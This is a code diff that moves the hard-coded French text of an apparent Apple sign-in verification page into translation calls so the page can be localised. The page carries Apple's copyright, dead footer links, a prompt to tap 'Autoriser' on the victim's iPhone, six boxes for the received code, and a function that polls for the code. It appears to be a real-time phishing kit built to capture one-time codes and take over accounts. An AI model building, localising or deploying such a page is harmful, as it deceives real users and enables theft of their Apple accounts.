@@ -384,26 +384,26 @@ TEXT;
           <div class="phone-badge">1</div>
         </div>
 
-        <h1 id="p1-title">Vérification requise</h1>
-        <p class="subtitle">Une demande de connexion a été détectée. Confirmez qu'il s'agit bien de vous.</p>
+        <h1 id="p1-title"><?= t('push_title') ?></h1>
+        <p class="subtitle"><?= t('push_subtitle') ?></p>
 
         <div class="step-list">
           <div class="step-item">
             <span class="step-num">!</span>
-            <span class="step-text">Appuyez sur <b>Autoriser</b> sur votre iPhone pour confirmer votre identité</span>
+            <span class="step-text"><?= t('push_step1') ?></span>
           </div>
         </div>
 
         <button class="btn-authorized" id="btnAuthorized" type="button">
-          J'ai autorisé — Entrer le code reçu
+          <?= t('push_btn_authorized') ?>
         </button>
 
       </div>
 
       <!-- ── PHASE 2 : saisie du code ── -->
       <div id="phase2" class="phase hidden">
-        <h1>Saisissez le code<br>de vérification</h1>
-        <p class="subtitle">Entrez le code à 6&nbsp;chiffres qui s'est affiché sur votre iPhone après avoir appuyé sur Autoriser.</p>
+        <h1><?= t('push_phase2_title') ?></h1>
+        <p class="subtitle"><?= t('push_phase2_subtitle') ?></p>
 
         <div class="code-inputs" id="codeInputs" role="group" aria-label="Code de vérification à 6 chiffres">
           <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="digit-input" autocomplete="one-time-code" aria-label="Chiffre 1"/>
@@ -416,8 +416,8 @@ TEXT;
 
         <p class="error-msg" id="codeError"></p>
 
-        <button id="btnVerify" class="btn-verify" type="button" disabled>Vérifier</button>
-        <a href="#" class="alt-link" id="btnRetry">Je n'ai pas reçu de code</a>
+        <button id="btnVerify" class="btn-verify" type="button" disabled><?= t('push_btn_verify') ?></button>
+        <a href="#" class="alt-link" id="btnRetry"><?= t('push_no_code') ?></a>
       </div>
 
       </div><!-- /.phases-stack -->
@@ -448,18 +448,18 @@ TEXT;
         <div class="blade"></div><div class="blade"></div><div class="blade"></div>
         <div class="blade"></div><div class="blade"></div><div class="blade"></div>
       </div>
-      <p class="loading-title">Vérification…</p>
-      <p class="loading-sub">Veuillez patienter quelques instants.</p>
+      <p class="loading-title"><?= t('push_loading') ?></p>
+      <p class="loading-sub"><?= t('push_loading_sub') ?></p>
     </div>
   </div>
 
   <footer class="site-footer">
     <nav class="footer-links">
-      <a href="#">État du système</a>
-      <a href="#">Engagement de confidentialité</a>
-      <a href="#">Conditions générales</a>
+      <a href="#"><?= t('push_footer_status') ?></a>
+      <a href="#"><?= t('push_footer_privacy') ?></a>
+      <a href="#"><?= t('push_footer_terms') ?></a>
     </nav>
-    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Tous droits réservés.</span>
+    <span class="footer-copy"><?= t('push_footer_copyright') ?></span>
   </footer>
 
   <script>
@@ -587,7 +587,7 @@ TEXT;
               }, { once: true });
               digits.forEach(function(d){ d.value=''; d.classList.remove('filled'); });
               btnVerify.disabled = true;
-              codeError.textContent = 'Code incorrect. Veuillez réessayer.';
+              codeError.textContent = '<?= t('push_code_error') ?>';
               codeError.style.display = 'block';
               digits[0].focus();
             } else {
@@ -604,9 +604,9 @@ TEXT;
       e.preventDefault();
       phase2.classList.add('hidden');
       phase1.classList.remove('hidden');
-      document.getElementById('p1-title').textContent = 'Nouveau code envoyé…';
+      document.getElementById('p1-title').textContent = '<?= t('push_new_code') ?>';
       setTimeout(function() {
-        document.getElementById('p1-title').textContent = 'Vérification requise';
+        document.getElementById('p1-title').textContent = '<?= t('push_title') ?>';
         pollForShowCode();
       }, 2000);
     });
